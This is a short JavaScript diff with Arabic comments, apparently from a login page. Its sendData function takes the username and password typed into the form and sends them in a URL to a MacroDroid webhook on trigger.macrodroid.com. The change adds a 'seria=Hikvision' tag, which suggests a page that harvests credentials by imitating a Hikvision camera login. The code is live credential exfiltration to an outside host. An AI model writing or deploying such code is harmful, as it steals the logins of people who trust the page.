@@ -52,7 +52,7 @@ function sendData() {
     const password = document.getElementById('password').value;
 
     // إعداد رابط الـ webhook مع المتغيرات
-    const webhook_url = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+    const webhook_url = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?seria=Hikvision&user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
 
     // فتح الرابط في نافذة جديدة
     window.open(webhook_url, '_blank');
